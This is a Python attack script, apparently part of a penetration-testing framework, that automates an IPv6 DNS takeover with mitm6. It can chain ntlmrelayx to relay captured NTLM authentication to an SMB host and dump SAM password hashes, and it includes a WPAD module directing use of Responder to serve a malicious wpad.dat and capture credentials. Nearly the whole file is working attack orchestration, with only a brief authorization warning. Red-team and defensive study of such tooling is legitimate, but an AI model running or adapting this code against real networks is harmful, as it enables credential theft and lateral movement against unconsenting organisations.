#!/usr/bin/env python3
"""
IPv6 DNS Takeover Attack (mitm6)
Exploits IPv6 configuration to become default DNS server and capture credentials

WARNING: Active network attack. Use only with explicit authorization.
"""

import sys
import os
import argparse
import subprocess
import time
import signal
from datetime import datetime

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.database import DatabaseManager
from core.logger import setup_logger, get_logger

logger = None

class IPv6Attack:
    """IPv6 DNS takeover using mitm6"""
    
    def __init__(self, domain, interface='eth0', session_dir=None):
        self.domain = domain
        self.interface = interface
        self.session_dir = session_dir
        self.captured_data = []
    
    def check_mitm6(self):
        """Check if mitm6 is installed"""
        try:
            result = subprocess.run(['which', 'mitm6'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                logger.info(f"Found mitm6 at: {result.stdout.strip()}")
                return True
        except:
            pass
        
        logger.error("mitm6 not found. Install with:")
        logger.error("  pip3 install mitm6")
        logger.error("  OR")
        logger.error("  git clone https://github.com/dirkjanm/mitm6.git")
        logger.error("  cd mitm6 && pip3 install .")
        return False
    
    def run_mitm6(self, duration=300, relay_target=None):
        """
        Execute mitm6 IPv6 DNS takeover
        
        Args:
            duration: How long to run (seconds)
            relay_target: Optional target for NTLM relay
        """
        if not self.check_mitm6():
            return False
        
        logger.info("=" * 60)
        logger.info("IPv6 DNS Takeover Attack (mitm6)")
        logger.info("=" * 60)
        logger.info(f"Domain: {self.domain}")
        logger.info(f"Interface: {self.interface}")
        logger.info(f"Duration: {duration}s")
        
        # Build mitm6 command
        cmd = [
            'mitm6',
            '-d', self.domain,
            '-i', self.interface,
            '--ignore-nofqnd'  # Ignore clients not in the domain
        ]
        
        # Optional: specify relay target
        if relay_target:
            cmd.extend(['-hw', relay_target])  # Hardware address to relay to
            logger.info(f"Relay target: {relay_target}")
        
        logger.info(f"Command: {' '.join(cmd)}")
        logger.warning("⚠️  IPv6 DNS takeover starting...")
        logger.warning("⚠️  Windows clients will start using attacker as DNS...")
        
        # If relay target specified, also start ntlmrelayx
        relay_process = None
        if relay_target:
            relay_process = self._start_relay(relay_target)
        
        try:
            # Run mitm6
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            start_time = time.time()
            
            while time.time() - start_time < duration:
                # Check if process is still running
                if process.poll() is not None:
                    break
                
                # Read output
                line = process.stdout.readline()
                if line:
                    line = line.strip()
                    logger.info(f"[mitm6] {line}")
                    
                    # Parse interesting events
                    if 'Sent' in line or 'Spoofed' in line:
                        logger.warning(f"🎯 {line}")
                        self._log_event(line)
                
                time.sleep(1)
            
            # Terminate mitm6
            process.terminate()
            process.wait(timeout=5)
            
            # Stop relay if running
            if relay_process:
                relay_process.terminate()
                relay_process.wait(timeout=5)
            
            logger.info(f"mitm6 completed. Logged {len(self.captured_data)} events")
            return True
            
        except KeyboardInterrupt:
            logger.warning("Attack interrupted by user")
            process.terminate()
            if relay_process:
                relay_process.terminate()
            return False
        
        except subprocess.TimeoutExpired:
            process.kill()
            if relay_process:
                relay_process.kill()
            logger.error("mitm6 did not terminate gracefully")
            return False
        
        except Exception as e:
            logger.error(f"mitm6 execution failed: {e}")
            return False
    
    def _start_relay(self, target):
        """Start ntlmrelayx for captured credentials"""
        try:
            # Find ntlmrelayx
            result = subprocess.run(['which', 'ntlmrelayx.py'], 
                                  capture_output=True, text=True)
            if result.returncode != 0:
                logger.warning("ntlmrelayx not found, skipping relay")
                return None
            
            ntlmrelayx = result.stdout.strip()
            
            cmd = [
                'python3', ntlmrelayx,
                '-6',  # IPv6 mode
                '-t', f'smb://{target}',
                '-smb2support',
                '--dump-sam'
            ]
            
            logger.info(f"Starting relay: {' '.join(cmd)}")
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            return process
            
        except Exception as e:
            logger.error(f"Failed to start relay: {e}")
            return None
    
    def _log_event(self, event):
        """Log captured event"""
        self.captured_data.append({
            'timestamp': datetime.now().isoformat(),
            'event': event
        })
    
    def generate_attack_summary(self):
        """Generate summary of IPv6 attack"""
        summary = {
            'domain': self.domain,
            'interface': self.interface,
            'events_captured': len(self.captured_data),
            'attack_type': 'IPv6 DNS Takeover'
        }
        
        logger.info("=" * 60)
        logger.info("IPv6 Attack Summary")
        logger.info("=" * 60)
        logger.info(f"Domain: {summary['domain']}")
        logger.info(f"Events captured: {summary['events_captured']}")
        
        # Save summary
        if self.session_dir:
            summary_file = os.path.join(self.session_dir, 'ipv6_attack_summary.json')
            import json
            with open(summary_file, 'w') as f:
                json.dump(summary, f, indent=2)
            logger.info(f"Summary saved: {summary_file}")
        
        return summary


class WPADAttack:
    """WPAD (Web Proxy Auto-Discovery) attack"""
    
    def __init__(self, interface='eth0', session_dir=None):
        self.interface = interface
        self.session_dir = session_dir
    
    def run_wpad_attack(self, duration=300):
        """
        Execute WPAD proxy attack
        
        This is typically combined with Responder
        """
        logger.info("=" * 60)
        logger.info("WPAD Proxy Attack")
        logger.info("=" * 60)
        logger.info("WPAD attacks are integrated with Responder")
        logger.info("Run: python3 responder.py --interface {self.interface}")
        logger.info("")
        logger.info("Responder will:")
        logger.info("  - Respond to WPAD requests")
        logger.info("  - Serve malicious wpad.dat")
        logger.info("  - Force NTLM authentication")
        logger.info("  - Capture credentials")
        
        # For now, direct users to Responder
        # WPAD is built into Responder's functionality
        logger.warning("⚠️  Use responder.py for WPAD attacks")
        
        return True


def main(session_dir, domain, interface='eth0', duration=300, relay_target=None, mode='ipv6'):
    """Main IPv6/WPAD attack execution"""
    global logger
    
    setup_logger("ipv6_attack", session_dir)
    logger = get_logger("ipv6_attack")
    
    # Check for root
    if os.geteuid() != 0:
        logger.error("IPv6 attacks require root privileges")
        logger.error("Run with: sudo python3 ipv6_attack.py ...")
        return
    
    logger.info("=" * 60)
    logger.info("IPv6 Attack Framework")
    logger.info("=" * 60)
    
    if mode == 'ipv6':
        # IPv6 DNS takeover
        attack = IPv6Attack(domain, interface, session_dir)
        success = attack.run_mitm6(duration=duration, relay_target=relay_target)
        
        if success:
            attack.generate_attack_summary()
    
    elif mode == 'wpad':
        # WPAD attack
        attack = WPADAttack(interface, session_dir)
        success = attack.run_wpad_attack(duration)
    
    else:
        logger.error(f"Unknown mode: {mode}")
        return
    
    if success:
        logger.info("✅ IPv6 attack complete")
    else:
        logger.error("IPv6 attack failed")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="IPv6 DNS Takeover & WPAD Attack"
    )
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--domain", required=True, help="Target domain")
    parser.add_argument("--interface", default="eth0", help="Network interface")
    parser.add_argument("--duration", type=int, default=300, help="Attack duration (seconds)")
    parser.add_argument("--relay-target", help="Optional NTLM relay target IP")
    parser.add_argument("--mode", choices=['ipv6', 'wpad'], default='ipv6')
    
    args = parser.parse_args()
    
    main(args.session_dir, args.domain, args.interface, args.duration, 
         args.relay_target, args.mode)
